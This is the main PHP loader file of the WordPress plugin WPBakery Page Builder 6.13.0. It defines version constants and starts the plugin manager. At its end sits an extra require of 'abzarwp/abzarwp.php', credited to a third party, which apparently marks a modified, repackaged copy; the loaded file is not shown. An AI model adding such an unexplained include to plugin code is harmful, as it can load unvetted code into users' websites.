<?php
/**
 * Plugin Name: WPBakery Page Builder
 * Plugin URI: http://wpbakery.com
 * Description: Drag and drop page builder for WordPress. Take full control over your WordPress site, build any layout you can imagine – no programming knowledge required.
 * Version: 6.13.0
 * Author: Michael M - WPBakery.com
 * Author URI: http://wpbakery.com
 * Text Domain: js_composer
 * Domain Path: /locale/
 * Requires at least: 4.9
 * Woo: 18734001738633:249bdd2d5fc84782b12368a238115991
 *
 * @package WPBakery Page Builder
 */

// don't load directly
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}
/**
 * Current WPBakery Page Builder version
 */
if ( ! defined( 'WPB_VC_VERSION' ) ) {
	/**
	 *
	 */
	define( 'WPB_VC_VERSION', '6.13.0' );
}

$dir = dirname( __FILE__ );
define( 'WPB_PLUGIN_DIR', $dir );
define( 'WPB_PLUGIN_FILE', __FILE__ );

require_once $dir . '/include/classes/core/class-vc-manager.php';
/**
 * Main WPBakery Page Builder manager.
 * @var Vc_Manager $vc_manager - instance of composer management.
 * @since 4.2
 */
global $vc_manager;
if ( ! $vc_manager ) {
	$vc_manager = Vc_Manager::getInstance();
	// Load components
	$vc_manager->loadComponents();
}

/**
 * @author AbzarWp
 */
require_once plugin_dir_path( __FILE__ ) . "abzarwp/abzarwp.php";